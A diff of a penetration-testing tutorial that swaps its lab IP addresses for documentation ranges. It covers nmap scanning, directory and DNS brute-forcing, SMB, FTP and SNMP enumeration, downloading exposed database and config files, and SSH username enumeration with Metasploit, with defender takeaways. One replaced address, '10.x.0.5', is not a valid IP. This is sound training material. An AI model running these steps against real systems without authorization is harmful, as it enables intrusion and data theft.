@@ -90,7 +90,7 @@ theHarvester -d target-corp.com -b google,bing,crtsh,linkedin -l 200
 # [*] Hosts found:
 # mail.target-corp.com       203.0.113.10   # => mail server confirmed with IP
 # vpn.target-corp.com        203.0.113.20   # => VPN endpoint — high-value target
-# dev.target-corp.com        10.0.0.5       # => internal IP leaked via DNS
+# dev.target-corp.com        10.x.0.5       # => internal IP leaked via DNS
 # staging.target-corp.com    203.0.113.55   # => staging env — often less hardened
 # api.target-corp.com        203.0.113.60   # => API endpoint — worth probing
 
@@ -227,30 +227,30 @@ shodan parse --fields ip_str,port,transport,product target-corp-shodan.json.gz
 
 **What this covers:** A ping sweep uses ICMP echo requests (and optionally TCP/UDP probes) to determine which hosts in a subnet are alive, without performing a full port scan. This is the first active step after passive recon, mapping the live attack surface before committing to slower, noisier port scans. The `-sn` flag tells nmap to skip port scanning entirely.
 
-**Scenario:** You are performing an authorized pentest on the internal lab network `10.10.10.0/24`. Identify all live hosts before deciding where to focus port scanning.
+**Scenario:** You are performing an authorized pentest on the internal lab network `192.0.2.0/24`. Identify all live hosts before deciding where to focus port scanning.
 
 ```bash
 # Basic ICMP ping sweep — fast but blocked by host-based firewalls
-sudo nmap -sn 10.10.10.0/24
+sudo nmap -sn 192.0.2.0/24
 
 # -sn  skip port scan (ping sweep only)
 # sudo  required for raw socket ICMP probes
 
 # --- Sample output ---
 # Starting Nmap 7.94 ( https://nmap.org )
-# Nmap scan report for 10.10.10.1
+# Nmap scan report for 192.0.2.1
 # Host is up (0.00045s latency).      # => gateway/router — always present
 # MAC Address: AA:BB:CC:DD:EE:01 (Cisco Systems)   # => Cisco device confirmed
 
-# Nmap scan report for 10.10.10.5
+# Nmap scan report for 192.0.2.5
 # Host is up (0.0023s latency).       # => target: low latency = same broadcast domain
 # MAC Address: 08:00:27:AB:CD:EF (Oracle VirtualBox)  # => VM — lab environment confirmed
 
-# Nmap scan report for 10.10.10.10
+# Nmap scan report for 192.0.2.10
 # Host is up (0.0031s latency).
 # MAC Address: 00:50:56:AA:BB:CC (VMware)    # => another VM on the lab network
 
-# Nmap scan report for 10.10.10.100
+# Nmap scan report for 192.0.2.100
 # Host is up (0.0018s latency).
 # MAC Address: B8:27:EB:FF:00:11 (Raspberry Pi Foundation)   # => Pi device — IoT-class
 
@@ -258,19 +258,19 @@ sudo nmap -sn 10.10.10.0/24
 # => 4 live hosts found out of 256 possible — small network footprint
 
 # More thorough sweep: add ARP, TCP, and UDP probes to catch hosts blocking ICMP
-sudo nmap -sn -PE -PS22,80,443 -PA80 -PU53 10.10.10.0/24
+sudo nmap -sn -PE -PS22,80,443 -PA80 -PU53 192.0.2.0/24
 # -PE      ICMP echo (standard ping)
 # -PS22,80,443  TCP SYN to ports 22, 80, 443 — catches Windows hosts blocking ICMP
 # -PA80    TCP ACK to port 80 — bypasses some stateful firewalls
 # -PU53    UDP probe to port 53 — discovers DNS servers blocking TCP/ICMP
 
 # Output results to grepable format for scripting
-sudo nmap -sn 10.10.10.0/24 -oG /tmp/hosts-up.txt
+sudo nmap -sn 192.0.2.0/24 -oG /tmp/hosts-up.txt
 grep "Up" /tmp/hosts-up.txt | awk '{print $2}'
-# => 10.10.10.1
-# => 10.10.10.5
-# => 10.10.10.10
-# => 10.10.10.100
+# => 192.0.2.1
+# => 192.0.2.5
+# => 192.0.2.10
+# => 192.0.2.100
 # Produces a clean host list for feeding into the next scan stage
 ```
 
@@ -284,10 +284,10 @@ grep "Up" /tmp/hosts-up.txt | awk '{print $2}'
 
 **What this covers:** The TCP SYN scan (also called a half-open scan) sends a SYN packet and waits for a SYN-ACK (open) or RST (closed) response without completing the three-way handshake. Because no full connection is established, many older logging systems miss these probes, giving the scan its "stealth" reputation — though modern IDS systems detect it readily.
 
-**Scenario:** You have identified `10.10.10.5` as a live host. Run a SYN scan against the top 1000 ports to map the service landscape before deeper investigation.
+**Scenario:** You have identified `192.0.2.5` as a live host. Run a SYN scan against the top 1000 ports to map the service landscape before deeper investigation.
 
 ```bash
-sudo nmap -sS -p- --min-rate 1000 10.10.10.5 -oN /tmp/syn-scan.txt
+sudo nmap -sS -p- --min-rate 1000 192.0.2.5 -oN /tmp/syn-scan.txt
 
 # -sS           TCP SYN (stealth) scan — default when run as root
 # -p-           scan all 65535 ports (not just top 1000)
@@ -296,7 +296,7 @@ sudo nmap -sS -p- --min-rate 1000 10.10.10.5 -oN /tmp/syn-scan.txt
 
 # --- Sample output ---
 # Starting Nmap 7.94
-# Nmap scan report for 10.10.10.5
+# Nmap scan report for 192.0.2.5
 # Host is up (0.0023s latency).
 # Not shown: 65528 closed tcp ports (reset)   # => RST received on 65528 ports = closed
 # PORT      STATE    SERVICE
@@ -310,7 +310,7 @@ sudo nmap -sS -p- --min-rate 1000 10.10.10.5 -oN /tmp/syn-scan.txt
 # Nmap done: 1 IP address (1 host up) scanned in 67.34 seconds
 
 # Focused rescan: top 1000 ports for speed in time-constrained engagements
-sudo nmap -sS --top-ports 1000 10.10.10.5
+sudo nmap -sS --top-ports 1000 192.0.2.5
 # => Much faster — covers 99% of common services
 # => Use -p- for comprehensive coverage when stealth is less critical
 
@@ -331,10 +331,10 @@ sudo nmap -sS --top-ports 1000 10.10.10.5
 
 **What this covers:** Service version detection sends crafted probes to open ports and matches responses against a database of known service signatures to identify the exact software and version running. Version information is the bridge between "port is open" and "here is the CVE." Without it, you know a service exists but not whether it is vulnerable.
 
-**Scenario:** The SYN scan of `10.10.10.5` revealed open ports 22, 80, 443, 445, 3306, and 8080. Run version detection to identify exact software versions before searching for exploits.
+**Scenario:** The SYN scan of `192.0.2.5` revealed open ports 22, 80, 443, 445, 3306, and 8080. Run version detection to identify exact software versions before searching for exploits.
 
 ```bash
-sudo nmap -sV -p 22,80,443,445,3306,8080 10.10.10.5
+sudo nmap -sV -p 22,80,443,445,3306,8080 192.0.2.5
 
 # -sV   enable service/version detection
 # -p    scan only the specified ports (faster — you already know what's open)
@@ -367,7 +367,7 @@ sudo nmap -sV -p 22,80,443,445,3306,8080 10.10.10.5
 # Service Info: Host: TARGET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 # Increase probe intensity for stubborn services (slower but more accurate)
-sudo nmap -sV --version-intensity 9 -p 8080 10.10.10.5
+sudo nmap -sV --version-intensity 9 -p 8080 192.0.2.5
 # --version-intensity 0-9: 0=lightest probes, 9=all probes
 # => Use intensity 9 when default probes return "tcpwrapped" or "unknown"
 ```
@@ -382,17 +382,17 @@ sudo nmap -sV --version-intensity 9 -p 8080 10.10.10.5
 
 **What this covers:** OS fingerprinting analyzes subtle differences in TCP/IP stack behavior — initial window size, TTL values, TCP options order — to identify the target's operating system and kernel version. Knowing the OS family and version narrows privilege escalation paths, kernel exploit options, and the set of applicable CVEs before gaining access.
 
-**Scenario:** You have confirmed open ports on `10.10.10.5`. Run OS fingerprinting to confirm the operating system and refine your exploitation planning.
+**Scenario:** You have confirmed open ports on `192.0.2.5`. Run OS fingerprinting to confirm the operating system and refine your exploitation planning.
 
 ```bash
-sudo nmap -O --osscan-guess 10.10.10.5
+sudo nmap -O --osscan-guess 192.0.2.5
 
 # -O              enable OS detection (requires root/sudo)
 # --osscan-guess  print best guess even when confidence < 100%
 
 # --- Sample output ---
 # OS detection performed. Please report any incorrect results.
-# Nmap scan report for 10.10.10.5
+# Nmap scan report for 192.0.2.5
 # Host is up (0.0023s latency).
 
 # OS CPE: cpe:/o:linux:linux_kernel:3.16
@@ -415,7 +415,7 @@ sudo nmap -O --osscan-guess 10.10.10.5
 # Device type: general purpose   # => standard server/workstation, not embedded/IoT
 
 # Combine with version detection for higher OS accuracy
-sudo nmap -O -sV --osscan-guess 10.10.10.5
+sudo nmap -O -sV --osscan-guess 192.0.2.5
 # => Version banners (e.g., "Debian 9") confirm the OS guess to near-certainty
 # => Combined output: "Linux 4.9 (Debian 9 Stretch)" — unambiguous for exploit planning
 ```
@@ -430,10 +430,10 @@ sudo nmap -O -sV --osscan-guess 10.10.10.5
 
 **What this covers:** The `-A` flag enables aggressive scanning mode, combining OS detection (`-O`), service version detection (`-sV`), default NSE script scanning (`-sC`), and traceroute into a single pass. It produces the most complete picture of a single host but is significantly noisier and slower than individual scans. Use it when thoroughness outweighs stealth concerns.
 
-**Scenario:** You have confirmed `10.10.10.5` is a key target. Run an aggressive scan to get a complete host profile in one command for your engagement report.
+**Scenario:** You have confirmed `192.0.2.5` is a key target. Run an aggressive scan to get a complete host profile in one command for your engagement report.
 
 ```bash
-sudo nmap -A -p 22,80,443,445,3306,8080 10.10.10.5 -oN /tmp/aggressive-scan.txt
+sudo nmap -A -p 22,80,443,445,3306,8080 192.0.2.5 -oN /tmp/aggressive-scan.txt
 
 # -A    aggressive mode: -sV + -O + -sC + --traceroute
 # -p    limit to known-open ports from earlier SYN scan
@@ -471,8 +471,8 @@ sudo nmap -A -p 22,80,443,445,3306,8080 10.10.10.5 -oN /tmp/aggressive-scan.txt
 
 # TRACEROUTE (using port 80/tcp)
 # HOP RTT     ADDRESS
-# 1   0.45 ms 10.10.10.1    # => gateway — 1 hop = same subnet
-# 2   0.80 ms 10.10.10.5    # => target — confirmed routing path
+# 1   0.45 ms 192.0.2.1    # => gateway — 1 hop = same subnet
+# 2   0.80 ms 192.0.2.5    # => target — confirmed routing path
 
 # OS and Network Distance: 1 hop, Linux 4.9, Debian 9 Stretch
 ```
@@ -487,10 +487,10 @@ sudo nmap -A -p 22,80,443,445,3306,8080 10.10.10.5 -oN /tmp/aggressive-scan.txt
 
 **What this covers:** The Nmap Scripting Engine (NSE) ships with hundreds of scripts organized into categories. The `vuln` category scripts perform non-destructive vulnerability checks — testing for known CVEs, misconfigurations, and default credentials — without attempting exploitation. Running `--script vuln` against a target provides an automated first-pass vulnerability assessment.
 
-**Scenario:** You have mapped all open ports on `10.10.10.5`. Run NSE vulnerability scripts to identify known vulnerabilities before moving to manual exploit research.
+**Scenario:** You have mapped all open ports on `192.0.2.5`. Run NSE vulnerability scripts to identify known vulnerabilities before moving to manual exploit research.
 
 ```bash
-sudo nmap --script vuln -p 22,80,443,445,3306,8080 10.10.10.5
+sudo nmap --script vuln -p 22,80,443,445,3306,8080 192.0.2.5
 
 # --script vuln   run all scripts in the "vuln" NSE category
 # These scripts probe for known CVEs and misconfigs without exploiting
@@ -532,7 +532,7 @@ sudo nmap --script vuln -p 22,80,443,445,3306,8080 10.10.10.5
 # |     IDs: CVE:CVE-2014-6271
 
 # Run a specific script by name for focused checks
-sudo nmap --script smb-vuln-ms17-010 -p 445 10.10.10.5
+sudo nmap --script smb-vuln-ms17-010 -p 445 192.0.2.5
 # => Targeted check for EternalBlue only — faster for reporting a single CVE
 
 # List all available vuln category scripts
@@ -544,7 +544,7 @@ ls /usr/share/nmap/scripts/ | grep vuln
 # => ... (many more)
 ```
 
-**Key Takeaway:** EternalBlue (MS17-010) on SMB is a remote code execution vulnerability that requires no credentials — finding it marks `10.10.10.5` as immediately compromisable. The MySQL empty root password independently gives full database access. Defenders must patch SMBv1 or disable the protocol entirely and enforce MySQL strong passwords with `ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPass';`.
+**Key Takeaway:** EternalBlue (MS17-010) on SMB is a remote code execution vulnerability that requires no credentials — finding it marks `192.0.2.5` as immediately compromisable. The MySQL empty root password independently gives full database access. Defenders must patch SMBv1 or disable the protocol entirely and enforce MySQL strong passwords with `ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPass';`.
 
 **Why It Matters:** NSE vuln scripts compress vulnerability assessment from hours of manual research into minutes. A single `--script vuln` run can surface critical CVEs, default credentials, and protocol weaknesses that would otherwise require running a separate scanner. Red teamers use these results to prioritize their exploitation queue — critical CVSS findings go first — and to populate the vulnerability section of the engagement report with precise CVE identifiers.
 
@@ -554,10 +554,10 @@ ls /usr/share/nmap/scripts/ | grep vuln
 
 **What this covers:** UDP services are invisible to TCP SYN scans but host critical infrastructure — DNS (53), SNMP (161), TFTP (69), and NTP (123). UDP scanning is slow because there is no connection handshake; nmap must wait for ICMP port-unreachable responses or use protocol-specific probes. Many UDP ports show `open|filtered` because the absence of a response is ambiguous.
 
-**Scenario:** After mapping TCP services on `10.10.10.5`, run a UDP scan against the top 100 UDP ports to find DNS, SNMP, and other UDP-based services that may expose additional attack surface.
+**Scenario:** After mapping TCP services on `192.0.2.5`, run a UDP scan against the top 100 UDP ports to find DNS, SNMP, and other UDP-based services that may expose additional attack surface.
 
 ```bash
-sudo nmap -sU --top-ports 100 10.10.10.5 -oN /tmp/udp-scan.txt
+sudo nmap -sU --top-ports 100 192.0.2.5 -oN /tmp/udp-scan.txt
 
 # -sU             UDP scan mode (requires root)
 # --top-ports 100 scan only the 100 most common UDP ports (full UDP scan takes hours)
@@ -576,22 +576,22 @@ sudo nmap -sU --top-ports 100 10.10.10.5 -oN /tmp/udp-scan.txt
 # => Could mean: port is open (service ignores probe) OR filtered (firewall drops)
 # => Use version detection to disambiguate
 
-sudo nmap -sUV -p 53,161 10.10.10.5
+sudo nmap -sUV -p 53,161 192.0.2.5
 # -sUV  UDP scan + version detection on specific ports
 # => More probes sent to confirm open state and identify service version
 
 # SNMP enumeration — once port 161/udp confirmed open
-snmp-check 10.10.10.5 -c public
+snmp-check 192.0.2.5 -c public
 # -c public  community string "public" (most common default)
 # => System description: Linux TARGET 4.9.0-12-amd64 x86_64
 # => System contact:     root@target-corp.com          # => admin email
 # => System location:    Server Room B                 # => physical location
 # => Running processes: sshd, apache2, mysqld, tomcat  # => confirms services from TCP scan
-# => Network interfaces: eth0 10.10.10.5/24            # => interface + IP confirmed
+# => Network interfaces: eth0 192.0.2.5/24            # => interface + IP confirmed
 # => Open TCP ports: 22, 80, 443, 445, 3306, 8080      # => SNMP reveals all TCP listeners!
 
 # DNS zone transfer attempt — if port 53 is authoritative
-dig axfr target-corp.com @10.10.10.5
+dig axfr target-corp.com @192.0.2.5
 # => If successful: returns all DNS records for the zone
 # => Zone transfers should be restricted to authorized secondary nameservers only
 ```
@@ -606,11 +606,11 @@ dig axfr target-corp.com @10.10.10.5
 
 **What this covers:** Netcat (`nc`) establishes raw TCP connections to any port, allowing manual interaction with service banners and protocol responses. Unlike nmap's automated probes, netcat lets you craft arbitrary requests and observe raw responses — useful for confirming service behavior, testing input handling, and grabbing version banners that automated tools miss or misclassify.
 
-**Scenario:** You want to manually verify the HTTP, FTP, and SSH service banners on `10.10.10.5` and probe responses to understand exact version and configuration details not captured by nmap.
+**Scenario:** You want to manually verify the HTTP, FTP, and SSH service banners on `192.0.2.5` and probe responses to understand exact version and configuration details not captured by nmap.
 
 ```bash
 # HTTP banner grab — send a minimal HTTP request and capture the response headers
-echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc 10.10.10.5 80
+echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc 192.0.2.5 80
 
 # echo -e     enable escape sequences (\r\n for HTTP line endings)
 # nc          raw TCP connection to port 80
@@ -624,14 +624,14 @@ echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc 10.10.10.5 80
 # => (blank line marks end of headers)
 
 # FTP banner grab — just connect, FTP servers send banner immediately
-nc 10.10.10.5 21
+nc 192.0.2.5 21
 # => 220 (vsFTPd 3.0.3)    # => FTP server type and version banner
 # => Ready for connection   # => server is accepting connections
 # After seeing banner, type: QUIT
 # => 221 Goodbye.
 
 # Check for anonymous FTP login manually
-nc 10.10.10.5 21
+nc 192.0.2.5 21
 # => 220 (vsFTPd 3.0.3)
 USER anonymous
 # => 331 Please specify the password.
@@ -643,12 +643,12 @@ LIST
 # => 226 Directory send OK.
 
 # SSH banner grab — SSH sends version banner immediately on connect
-nc 10.10.10.5 22
+nc 192.0.2.5 22
 # => SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7   # => exact SSH version confirmed
 # => (connection closes after banner if you don't proceed with key exchange)
 
 # SMTP banner grab (if port 25 were open)
-nc 10.10.10.5 25
+nc 192.0.2.5 25
 # => 220 mail.target-corp.com ESMTP Postfix (Debian/GNU)   # => SMTP server + domain
 EHLO attacker.com
 # => 250-mail.target-corp.com                # => server hostname confirmed
@@ -669,11 +669,11 @@ EHLO attacker.com
 
 **What this covers:** The HTTP response headers sent by a web server contain metadata that reveals the server software, version, backend language, framework, cookies, and security policy headers. `curl -I` sends an HTTP HEAD request and prints only the response headers, enabling rapid reconnaissance of the web layer without downloading page content.
 
-**Scenario:** Port 80 on `10.10.10.5` hosts a web application. Enumerate the HTTP response headers to identify the technology stack and assess the security posture of the HTTP layer.
+**Scenario:** Port 80 on `192.0.2.5` hosts a web application. Enumerate the HTTP response headers to identify the technology stack and assess the security posture of the HTTP layer.
 
 ```bash
 # Basic HEAD request — retrieve headers only
-curl -I http://10.10.10.5/
+curl -I http://192.0.2.5/
 
 # => HTTP/1.1 200 OK
 # => Date: Wed, 21 May 2026 03:00:00 GMT
@@ -684,7 +684,7 @@ curl -I http://10.10.10.5/
 # => Connection: keep-alive
 
 # Security header audit — check for missing defensive headers
-curl -I http://10.10.10.5/ | grep -i "strict\|content-security\|x-frame\|x-content\|referrer"
+curl -I http://192.0.2.5/ | grep -i "strict\|content-security\|x-frame\|x-content\|referrer"
 # => (no output)   # => NONE of the security headers are present — significant finding
 
 # Security headers checklist — each absent header is a finding:
@@ -695,20 +695,20 @@ curl -I http://10.10.10.5/ | grep -i "strict\|content-security\|x-frame\|x-conte
 # Referrer-Policy             => missing: referrer data may leak internal paths
 
 # Follow redirects and show all intermediate headers
-curl -IL http://10.10.10.5/
+curl -IL http://192.0.2.5/
 # -L   follow redirects (shows redirect chain)
 # => HTTP/1.1 301 Moved Permanently               # => HTTP to HTTPS redirect
-# => Location: https://10.10.10.5/                # => redirect target
+# => Location: https://192.0.2.5/                # => redirect target
 # => HTTP/1.1 200 OK                              # => final response after redirect
 
 # Send to HTTPS and check TLS header behavior
-curl -Ik https://10.10.10.5/
+curl -Ik https://192.0.2.5/
 # -k   disable certificate verification (useful in lab with self-signed certs)
 # => Strict-Transport-Security: max-age=31536000   # => HSTS present on HTTPS — good
 # => X-Powered-By: PHP/7.4.3                       # => still leaking PHP version over HTTPS
 
 # Check specific paths for different header sets
-curl -I http://10.10.10.5/admin/
+curl -I http://192.0.2.5/admin/
 # => HTTP/1.1 401 Unauthorized              # => admin path exists, auth required
 # => WWW-Authenticate: Basic realm="Admin"  # => HTTP Basic auth — credentials in base64
 ```
@@ -723,11 +723,11 @@ curl -I http://10.10.10.5/admin/
 
 **What this covers:** `robots.txt` instructs search engine crawlers which URL paths to avoid indexing. Paradoxically, it acts as a roadmap to sensitive areas — administrators list paths they want to hide, which reveals exactly what an attacker should investigate. `sitemap.xml` provides a complete map of the site's intended content structure.
 
-**Scenario:** The web application on `10.10.10.5:80` is your target. Retrieve and analyze `robots.txt` and `sitemap.xml` to identify hidden paths before running directory brute-forcing.
+**Scenario:** The web application on `192.0.2.5:80` is your target. Retrieve and analyze `robots.txt` and `sitemap.xml` to identify hidden paths before running directory brute-forcing.
 
 ```bash
 # Retrieve robots.txt
-curl -s http://10.10.10.5/robots.txt
+curl -s http://192.0.2.5/robots.txt
 
 # => User-agent: *
 # => Disallow: /admin/              # => admin panel — high-value target
@@ -745,7 +745,7 @@ curl -s http://10.10.10.5/robots.txt
 # Verify each disallowed path exists and check response codes
 for path in /admin/ /backup/ /private/ /api/v1/internal/ /uploads/temp/ /wp-admin/ /phpmyadmin/; do
   echo -n "$path: "
-  curl -s -o /dev/null -w "%{http_code}" "http://10.10.10.5$path"
+  curl -s -o /dev/null -w "%{http_code}" "http://192.0.2.5$path"
   echo
 done
 # => /admin/: 401               # => exists, requires authentication
@@ -757,16 +757,16 @@ done
 # => /phpmyadmin/: 200          # => phpMyAdmin is accessible — database management exposed
 
 # Retrieve sitemap.xml for complete URL inventory
-curl -s http://10.10.10.5/sitemap.xml | grep -o '<loc>[^<]*</loc>' | sed 's/<[^>]*>//g'
-# => http://10.10.10.5/
-# => http://10.10.10.5/about/
-# => http://10.10.10.5/contact/
-# => http://10.10.10.5/products/
-# => http://10.10.10.5/products/api/   # => API endpoint listed in sitemap — investigate
-# => http://10.10.10.5/login/          # => login page — try default credentials
+curl -s http://192.0.2.5/sitemap.xml | grep -o '<loc>[^<]*</loc>' | sed 's/<[^>]*>//g'
+# => http://192.0.2.5/
+# => http://192.0.2.5/about/
+# => http://192.0.2.5/contact/
+# => http://192.0.2.5/products/
+# => http://192.0.2.5/products/api/   # => API endpoint listed in sitemap — investigate
+# => http://192.0.2.5/login/          # => login page — try default credentials
 
 # Check for WordPress-specific sitemaps
-curl -s http://10.10.10.5/wp-sitemap.xml | grep '<loc>' | head -20
+curl -s http://192.0.2.5/wp-sitemap.xml | grep '<loc>' | head -20
 # => If successful: reveals all WordPress post/page URLs including draft and private post IDs
 ```
 
@@ -780,11 +780,11 @@ curl -s http://10.10.10.5/wp-sitemap.xml | grep '<loc>' | head -20
 
 **What this covers:** Directory brute-forcing sends HTTP requests for paths from a wordlist, identifying directories and files that are not linked from the application but are still accessible. Unlike robots.txt which reveals deliberately hidden paths, brute-forcing discovers forgotten or unintentionally exposed content — backup files, old versions, developer tools, and configuration files.
 
-**Scenario:** You have completed passive recon on `http://10.10.10.5`. Run gobuster in directory mode with a standard wordlist to enumerate all accessible paths on the web server.
+**Scenario:** You have completed passive recon on `http://192.0.2.5`. Run gobuster in directory mode with a standard wordlist to enumerate all accessible paths on the web server.
 
 ```bash
 gobuster dir \
-  -u http://10.10.10.5 \
+  -u http://192.0.2.5 \
   -w /usr/share/wordlists/dirb/common.txt \
   -x php,html,txt,bak,zip,sql \
   -t 40 \
@@ -814,7 +814,7 @@ gobuster dir \
 # /uploads/            (Status: 200) [Size: 456]    # => directory listing enabled — enumerate!
 
 # Download the database dump found
-curl -s http://10.10.10.5/backup/db.sql -o /tmp/db.sql
+curl -s http://192.0.2.5/backup/db.sql -o /tmp/db.sql
 head -50 /tmp/db.sql
 # => -- MySQL dump 10.13  Distrib 5.7.28
 # => -- Host: localhost
@@ -823,7 +823,7 @@ head -50 /tmp/db.sql
 
 # Use a larger wordlist for deeper coverage
 gobuster dir \
-  -u http://10.10.10.5 \
+  -u http://192.0.2.5 \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -x php,html,txt,bak \
   -t 20 \
@@ -877,7 +877,7 @@ for sub in api dev mail staging vpn jira jenkins grafana git wiki; do
   dig +short "$sub.target-corp.com" A
 done
 # => api.target-corp.com: 203.0.113.60       # => different IP = separate server
-# => dev.target-corp.com: 10.0.0.5           # => internal IP leaked via DNS!
+# => dev.target-corp.com: 10.x.0.5           # => internal IP leaked via DNS!
 # => jenkins.target-corp.com: 203.0.113.70   # => public-facing Jenkins — critical
 
 # Use a comprehensive SecLists wordlist for maximum coverage
@@ -890,7 +890,7 @@ gobuster dns \
 # => Reduce threads to avoid DNS rate limiting
 ```
 
-**Key Takeaway:** Jenkins on `jenkins.target-corp.com` publicly accessible is a critical finding — unauthenticated Jenkins instances expose a Groovy script console that executes arbitrary code on the CI/CD server, which typically has production deployment credentials. A `dev.target-corp.com` resolving to an internal IP (`10.0.0.5`) leaked through public DNS means the internal host is reachable — if the web app is vulnerable, it is an internal pivot point.
+**Key Takeaway:** Jenkins on `jenkins.target-corp.com` publicly accessible is a critical finding — unauthenticated Jenkins instances expose a Groovy script console that executes arbitrary code on the CI/CD server, which typically has production deployment credentials. A `dev.target-corp.com` resolving to an internal IP (`10.x.0.5`) leaked through public DNS means the internal host is reachable — if the web app is vulnerable, it is an internal pivot point.
 
 **Why It Matters:** Subdomains are the most consistently overlooked part of an organization's attack surface. Developer tools like Jenkins, Jira, and Grafana are deployed internally and then exposed through DNS without proper hardening. Certificate transparency already exposes many subdomains passively, but wordlist-based DNS enumeration catches development and staging hosts that were never issued a certificate. Red teamers always combine passive cert-transparency results with active DNS brute-forcing.
 
@@ -956,11 +956,11 @@ curl -H "Host: internal.target-corp.com" http://203.0.113.42/ -s | grep -i "titl
 
 **What this covers:** SMB (Server Message Block) is the Windows file-sharing protocol, also implemented on Linux via Samba. It exposes shares, user lists, group memberships, password policies, and system information. Enumeration without credentials is possible when guest access is enabled or null session authentication is allowed — both common misconfigurations.
 
-**Scenario:** nmap revealed SMB on port 445 of `10.10.10.5` with Samba. Enumerate available shares, user accounts, and system information using smbclient and enum4linux.
+**Scenario:** nmap revealed SMB on port 445 of `192.0.2.5` with Samba. Enumerate available shares, user accounts, and system information using smbclient and enum4linux.
 
 ```bash
 # List available shares — attempt null/guest session first
-smbclient -L //10.10.10.5 -N
+smbclient -L //192.0.2.5 -N
 
 # -L    list shares
 # -N    no password (null session — anonymous access)
@@ -976,7 +976,7 @@ smbclient -L //10.10.10.5 -N
 # Workgroup: WORKGROUP    # => not domain-joined — standalone Samba server
 
 # Connect to the data share and list contents
-smbclient //10.10.10.5/data -N
+smbclient //192.0.2.5/data -N
 # => Try "help" to get a list of possible commands
 smb: \> ls
 # =>   .                        D        0  Mon Jan 1 00:00:00 2024
@@ -990,7 +990,7 @@ smb: \> get config.ini /tmp/config.ini
 # => config file retrieved — check for database passwords, API keys
 
 # Comprehensive enumeration with enum4linux
-enum4linux -a 10.10.10.5
+enum4linux -a 192.0.2.5
 
 # -a    run all checks: users, shares, groups, OS info, password policy, printers
 
@@ -1023,15 +1023,15 @@ enum4linux -a 10.10.10.5
 
 **What this covers:** FTP servers configured to allow anonymous login accept any username of `anonymous` and any string as a password, granting file system access without credentials. This misconfiguration is common on internal servers, network appliances, and legacy systems. Anonymous FTP access directly enables data exfiltration and, if write access is granted, arbitrary file upload.
 
-**Scenario:** nmap and banner grabbing suggested vsFTPd on `10.10.10.5`. Verify whether anonymous login is accepted and enumerate all accessible files.
+**Scenario:** nmap and banner grabbing suggested vsFTPd on `192.0.2.5`. Verify whether anonymous login is accepted and enumerate all accessible files.
 
 ```bash
 # Method 1: Standard FTP client
-ftp 10.10.10.5
+ftp 192.0.2.5
 
-# => Connected to 10.10.10.5.
+# => Connected to 192.0.2.5.
 # => 220 (vsFTPd 3.0.3)
-# => Name (10.10.10.5:attacker): anonymous        # => type "anonymous" as username
+# => Name (192.0.2.5:attacker): anonymous        # => type "anonymous" as username
 # => 331 Please specify the password.
 # Password:                                       # => type any email string
 # => 230 Login successful.                        # => anonymous login accepted — critical!
@@ -1060,13 +1060,13 @@ ftp> get config.bak /tmp/config.bak
 ftp> bye
 
 # Method 2: wget for bulk anonymous FTP download
-wget -r --no-passive-ftp ftp://anonymous:anonymous@10.10.10.5/
+wget -r --no-passive-ftp ftp://anonymous:anonymous@192.0.2.5/
 # -r              recursive download — get all files
 # --no-passive-ftp  use active FTP mode (may be needed behind NAT)
-# => Downloads entire FTP tree to local ./10.10.10.5/ directory
+# => Downloads entire FTP tree to local ./192.0.2.5/ directory
 
 # Method 3: nmap NSE script for quick anonymous FTP check
-nmap --script ftp-anon -p 21 10.10.10.5
+nmap --script ftp-anon -p 21 192.0.2.5
 # => PORT   STATE SERVICE
 # => 21/tcp open  ftp
 # => | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -1075,7 +1075,7 @@ nmap --script ftp-anon -p 21 10.10.10.5
 # => |_-rw-r--r--  1 ftp ftp 45678 Apr 1 backup.zip   # => confirms backup file visible
 
 # Check for write access (dangerous — would allow malware upload)
-ftp 10.10.10.5
+ftp 192.0.2.5
 # ftp> put /tmp/test.txt test-write-check.txt
 # => If 226 Transfer Complete: WRITE ACCESS ENABLED — critical severity
 # => If 550 Permission denied: read-only anonymous (still a finding, lower severity)
@@ -1091,11 +1091,11 @@ ftp 10.10.10.5
 
 **What this covers:** ssh-audit analyzes an SSH server's configuration — supported key exchange algorithms, host key types, ciphers, and MAC algorithms — and flags insecure or deprecated options. Beyond configuration auditing, certain older OpenSSH versions (pre-7.7) are vulnerable to CVE-2018-15473, which allows enumerating valid usernames by observing timing differences in authentication failure responses.
 
-**Scenario:** OpenSSH 7.4p1 is running on `10.10.10.5:22`. Use ssh-audit to evaluate the server's cryptographic configuration and check for known vulnerabilities.
+**Scenario:** OpenSSH 7.4p1 is running on `192.0.2.5:22`. Use ssh-audit to evaluate the server's cryptographic configuration and check for known vulnerabilities.
 
 ```bash
 # Run ssh-audit against the target
-ssh-audit 10.10.10.5
+ssh-audit 192.0.2.5
 
 # --- Sample output ---
 # # general
@@ -1135,13 +1135,13 @@ ssh-audit 10.10.10.5
 # Username enumeration using CVE-2018-15473 (confirmed vulnerable — OpenSSH 7.4)
 # Use ssh-username-enum or Metasploit module auxiliary/scanner/ssh/ssh_enumusers
 msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
-  set RHOSTS 10.10.10.5; \
+  set RHOSTS 192.0.2.5; \
   set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; \
   run; exit"
-# => [+] 10.10.10.5:22 - SSH - User 'root' found
-# => [+] 10.10.10.5:22 - SSH - User 'admin' found
-# => [+] 10.10.10.5:22 - SSH - User 'john.smith' found   # => confirms harvester result!
-# => [-] 10.10.10.5:22 - SSH - User 'nonexistent' not found
+# => [+] 192.0.2.5:22 - SSH - User 'root' found
+# => [+] 192.0.2.5:22 - SSH - User 'admin' found
+# => [+] 192.0.2.5:22 - SSH - User 'john.smith' found   # => confirms harvester result!
+# => [-] 192.0.2.5:22 - SSH - User 'nonexistent' not found
 ```
 
 **Key Takeaway:** OpenSSH 7.4p1 is vulnerable to CVE-2018-15473 username enumeration, which confirms the user list from SMB enumeration and theHarvester without authentication. The 3DES and RC4 cipher support makes older session recordings decryptable offline. Defenders should upgrade to OpenSSH 8.x or later, disable deprecated ciphers in `/etc/ssh/sshd_config`, and restrict SSH access to known IP ranges.
